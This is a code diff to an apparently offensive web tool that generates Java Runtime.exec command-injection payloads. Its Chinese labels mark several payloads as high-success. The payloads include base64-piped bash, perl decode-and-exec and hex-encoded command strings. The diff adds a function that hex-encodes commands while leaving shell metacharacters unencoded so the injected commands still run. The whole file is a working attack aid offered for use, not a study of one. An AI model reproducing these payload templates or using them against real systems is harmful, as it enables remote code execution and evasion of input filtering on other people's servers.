@@ -30,28 +30,32 @@ java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_orig
 参数类型: 字符串
 如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
 
-🔥实际payload for Linux【成功率很高】 支持Linux 不支持macOS
+🔥实际payload【成功率很高】 支持Linux 不支持macOS
 /bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash
 
 
-🔥实际payload    注意: 如果传入的字符串 里有 & _ < > | 符号时, 可能不会执行成功!
+🔥实际payload 【成功率低】 如果命令字符串 包含了 shell下的特殊字符 < > | & ; 则命令可能执行失败.
 /bin/bash -c $@|bash 0 arr0w1_cmd_origin
 /bin/bash -c $*|bash 0 arr0w1_cmd_origin
 </textarea>
 
     <textarea id="data3" hidden="true">
-
 3⃣️ base64编码 - 使用base64命令
 支持Linux 不支持macOS
+🔥实际payload
 {echo,arr0w1_base64}|{base64,-d}|bash
+
 
 4⃣️ base64编码 - 使用perl中的base64语句
 支持Linux/macOS
+🔥实际payload
 perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'
 
 5⃣️ hex编码
 支持Linux/macOS
-`echo -e "arr0w1_cmd_ascii2hex"`
+如果命令字符串 包含了 shell下的特殊字符 < > | & ; 自动不对它们做hex编码, 使命令执行成功.
+🔥实际payload
+`echo -e "ascii_2_Hex_without_black_chars_flag"`
 </textarea>
 
     <textarea id="data4" hidden="true">
@@ -205,6 +209,24 @@ function ascii_2_Hex(str) {
             return str;
         }
 
+function ascii_2_Hex_without_black_chars(str) {
+var regex_black_chars = /([<>|&;])/g;
+var str_array = str.split(regex_black_chars);
+// 排除 black_chars 如果命令里有这些字符,hex编码后的命令无法执行!
+
+var allstr = "";
+str_array.forEach (
+    function (one) {
+        if (one.match(regex_black_chars)){
+            one = one.replace(regex_black_chars,"\"`$& `echo -e \"");
+        }else{
+            one = ascii_2_Hex(one);
+        }
+        allstr += one;
+    }
+);
+return allstr;
+}
 
     // 生成不带=的base64字符串
     function func_wise_btoa(str1) {
@@ -234,7 +256,7 @@ function ascii_2_Hex(str) {
 
         document.getElementById("payload2").value = data2.replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
 
-        document.getElementById("payload3").value = data3.replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
+        document.getElementById("payload3").value = data3.replace(/ascii_2_Hex_without_black_chars_flag/g,ascii_2_Hex_without_black_chars(cmd_origin)).replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
 
         document.getElementById("payload4").value = data4.replace(/arr0w1_cmd_ascii2hex/g,ascii_2_Hex(cmd_origin)).replace(/arr0w1_cmd_origin/g,cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed).replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g,"\\'") );
 
